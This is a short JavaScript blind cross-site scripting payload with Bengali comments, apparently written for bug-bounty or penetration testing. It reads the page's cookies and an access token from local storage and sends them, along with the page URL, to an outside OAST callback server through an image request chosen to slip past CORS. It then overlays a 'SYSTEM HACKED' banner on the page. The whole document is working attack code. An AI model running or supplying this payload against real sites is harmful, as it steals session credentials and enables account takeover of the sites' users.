// ১. ডেটা সংগ্রহ করা
var stolenCookie = document.cookie;
var stolenToken = localStorage.getItem('access_token');
var targetURL = "https://spxyffdnlpmxmtrvgrlrrexbcqwaewiyp.oast.fun";

// ২. ওএএসটি (OAST) সার্ভারে ডেটা পাঠানো (Image ট্যাগ ব্যবহার করে, যাতে CORS ব্লক না করে)
var img = new Image();
var payload = "?cookie=" + encodeURIComponent(stolenCookie) + "&token=" + encodeURIComponent(stolenToken) + "&url=" + encodeURIComponent(window.location.href);
img.src = targetURL + payload;

// ৩. স্ক্রিনে লাল ব্যানার দেখানো (যদি স্ক্রিনে প্রমাণ চান)
var banner = document.createElement('div');
banner.style.cssText = "position:fixed; top:0; left:0; width:100%; background:red; color:white; padding:20px; z-index:999999; font-size:20px; text-align:center; font-weight:bold;";
banner.innerHTML = "SYSTEM HACKED - Blind XSS Ping Sent!";
document.body.appendChild(banner);
